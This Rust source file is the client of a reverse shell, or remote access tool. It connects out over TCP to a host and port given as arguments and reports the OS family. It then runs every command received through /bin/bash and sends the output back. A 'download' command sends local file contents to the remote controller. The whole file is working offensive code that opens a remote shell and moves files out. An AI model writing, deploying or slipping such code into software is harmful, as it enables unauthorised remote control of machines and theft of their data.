use std::error::Error;
use std::fs::File;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::process::{exit, Command};

enum HandlerStatus {
    Ok,
    MetadataError,
    FileError,
    CmdError,
    EndSession,
    SendError,
}

pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;

    let os = std::env::consts::FAMILY;
    let res = stream.write_all(os.as_bytes());

    if res.is_err() {
        println!("Error sending OS info : {}", res.err().unwrap());
        exit(7);
    }

    loop {
        let mut buff = [0; 4096];
        let read = stream.read(&mut buff);
        let bytes_read = match read {
            Ok(b) => b,
            Err(r) => {
                println!("Reading error : {}", r);
                continue;
            }
        };

        let cmd = String::from_utf8_lossy(&buff[..bytes_read])
            .trim_end_matches('\0')
            .to_string();

        println!("CMD: {}", cmd);

        match handler(cmd, &mut stream) {
            HandlerStatus::Ok => (),
            HandlerStatus::MetadataError => println!("File metadata error"),
            HandlerStatus::FileError => println!("File error"),
            HandlerStatus::CmdError => println!("Command error"),
            HandlerStatus::EndSession => {
                println!("Ending session");
                break;
            }
            HandlerStatus::SendError => {
                println!("Error sending data");
                break;
            }
        }
        stream.flush()?;
    }

    Ok(())
}

fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
    if cmd.starts_with("download") {
        dl_cmd(&cmd, tls_stream)
    } else if cmd.starts_with(".quit") {
        HandlerStatus::EndSession
    } else {
        run_cmd(&cmd, tls_stream)
    }
}

fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
    let path: Vec<&str> = cmd.split(' ').collect();
    match File::open(path[1]) {
        Ok(mut file) => match read_file(&mut file) {
            Ok(vec) => {
                let status = tls_stream.write_all(&vec);
                if status.is_err() {
                    return HandlerStatus::SendError;
                }
                HandlerStatus::Ok
            }
            Err(_) => HandlerStatus::FileError,
        },
        Err(_) => HandlerStatus::FileError,
    }
}

fn read_file(file: &mut File) -> Result<Vec<u8>, std::io::Error> {
    let mut reader = BufReader::new(file);
    let vec = reader.fill_buf()?.to_vec();
    Ok(vec)
}

fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
    let res = run(cmd);
    if res.is_none() {
        return HandlerStatus::CmdError;
    }
    let mut res = res.unwrap();
    if res.is_empty() {
        let status = tls_stream.write_all("\0".as_bytes());
        if status.is_err() {
            HandlerStatus::SendError
        } else {
            HandlerStatus::Ok
        }
    } else {
        let mut buff_to_send = [0; 4096];
        loop {
            let mut count = 0;
            for c in &res {
                if count == 4096 {
                    break;
                }
                buff_to_send[count] = *c;
                count += 1;
            }
            let status = tls_stream.write(&buff_to_send);
            if status.is_err() {
                return HandlerStatus::SendError;
            }
            buff_to_send = [0; 4096];
            if count < 4096 {
                break;
            }
            res = res.split_off(count);
        }
        HandlerStatus::Ok
    }
}

fn run(cmd: &String) -> Option<Vec<u8>> {
    let exec = Command::new("/bin/bash")
        .args(["-c", cmd.trim_end_matches("\r\n")])
        .output();
    if exec.is_err() {
        return None;
    }
    let exec = exec.unwrap();

    let stdo = exec.stdout.as_slice();
    let stderr = exec.stderr.as_slice();

    if stderr.is_empty() {
        Some(stdo.to_vec())
    } else {
        Some(stderr.to_vec())
    }
}
